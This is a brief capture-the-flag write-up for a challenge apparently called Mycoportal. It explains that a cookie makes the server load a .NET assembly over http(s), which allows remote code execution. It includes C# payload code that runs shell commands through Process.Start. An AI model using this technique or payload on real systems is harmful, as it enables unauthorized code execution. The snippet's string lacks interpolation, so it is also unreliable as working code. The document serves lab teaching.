Mycoportal - Flag 1

The goal of this flag is for the player to figure out that the cookie is loading the DLL and creating a type from the
DLL. The bug is that the `http(s)` schema is supported, so you can host a webserver and force the server to load
an arbitrary assembly. By crafting a malicious type which invokes System.Diagnostics.Process.Start, it's possible to
gain remote code execution.

The difficulty of the challenge lies in getting a working dotnet environment to build the malicious payload and
encoding it in the way that the cookie expects.

This script assumes that a DLL `Payloads.dll` has been built with the following C-Sharp Code:

```csharp
// Program.cs
namespace Payloads;

public class Execute
{
    public Execute()
    {

    }

    public string Cmd { 
        get => string.Empty; 
        
        set 
        {
            var cmd = value;
            System.Diagnostics.Process.Start("bash", "-c \"{cmd}\"");
        }
    }
}
```

This file can be generated if you run build/build.sh  (requires docker)
